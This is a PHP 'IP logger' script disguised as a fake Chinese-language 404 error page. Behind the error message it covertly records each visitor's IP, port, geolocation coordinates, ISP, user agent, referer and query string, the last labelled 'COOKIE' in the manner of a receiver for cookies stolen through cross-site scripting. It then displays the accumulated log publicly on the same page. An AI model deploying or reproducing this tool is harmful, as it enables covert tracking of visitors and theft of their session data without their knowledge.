<!DOCTYPE html>
<html>
<head>
	<title>Ip Loger</title>
</head>
<body>
<?php
require_once('geoplugin.class.php');
?>	
<?php
function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
} 
function logData() 
{ 
	$ipLog = "log.txt"; 
	
    $geoplugin = new geoPlugin();
    $geoplugin->locate(); 

	$cookie = $_SERVER['QUERY_STRING']; 

	$register_globals = (bool) ini_get('register_gobals'); 

	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 
	$rem_port = $_SERVER['REMOTE_PORT']; 
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	if (isset( $_SERVER['METHOD'])){
		$rqst_method = $_SERVER['METHOD'];
	}
	else{
		$rqst_method = "null";
	}
	if (isset( $_SERVER['REMOTE_HOST'])) {
		$rem_host = $_SERVER['REMOTE_HOST'];
	}
	else{
		$rem_host = "null";
	}
	if (isset($_SERVER['HTTP_REFERER'])) {
		$referer = $_SERVER['HTTP_REFERER'];
	}
	else
	{
		$referer = "null";
	}
	
	$time_zone = 'Asia/Shanghai';
	date_default_timezone_set($time_zone);
	$date=date ("Y-m-d H:i:s"); 
	$log=fopen("$ipLog", "a");
	// IP地址的城市,ISP,位置
	$ip_details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
    // 写入所有数据信息
	fwrite($log, "IP:" .$ip . PHP_EOL);
	fwrite($log, "时间:" . $date . PHP_EOL);
	fwrite($log, "端口:" . $rem_port . PHP_EOL);
	fwrite($log, "国家:" . $geoplugin->countryName . PHP_EOL);
	fwrite($log, "地区:"  .$geoplugin->region . PHP_EOL);
	fwrite($log, "城市:"  .$geoplugin->city . PHP_EOL);
	fwrite($log, "国家代码:"  .$geoplugin->countryCode . PHP_EOL);
	fwrite($log, "地区代码:"  .$geoplugin->regionCode . PHP_EOL);
	fwrite($log, "纬度:"  .$geoplugin->latitude . PHP_EOL);
	fwrite($log, "经度:"   .$geoplugin->longitude . PHP_EOL);
	fwrite($log, "时区:"   .$geoplugin->timezone . PHP_EOL);
	fwrite($log, "主机:" . $rem_host . PHP_EOL);
	fwrite($log, "用户代理:" . $user_agent . PHP_EOL);
	fwrite($log, "ISP:" . $ip_details->org . PHP_EOL);
	fwrite($log, "METHOD:" . $rqst_method . PHP_EOL);
	fwrite($log, "REF:" . $referer . PHP_EOL);
	fwrite($log, "COOKIE:" . $cookie . PHP_EOL );
} 
logData();
?>
<!-- 假的404页 -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>

        * {
            line-height: 1.2;
            margin: 0;
        }

        html {
            color: #888;
            display: table;
            font-family: sans-serif;
            height: 100%;
            text-align: center;
            width: 100%;
			font-size: 10px;
        }

        body {
            display: table-cell;
            vertical-align: middle;
            margin: 2em auto;
        }

        h1 {
            color: #555;
            font-size: 2em;
            font-weight: 400;
        }

        p {
            margin: 0 auto;
            width: 280px;
        }

        @media only screen and (max-width: 280px) {

            body, p {
                width: 95%;
            }

            h1 {
                font-size: 1.5em;
                margin: 0 0 0.3em;
            }

        }

    </style>
</head>
<body>
    <h1>404</h1>
    <p>抱歉,您查看的页面不存在.</p></br>
	<?php
	readfile("log.txt");
	?>
</body>
</html>
</body>
</html> 
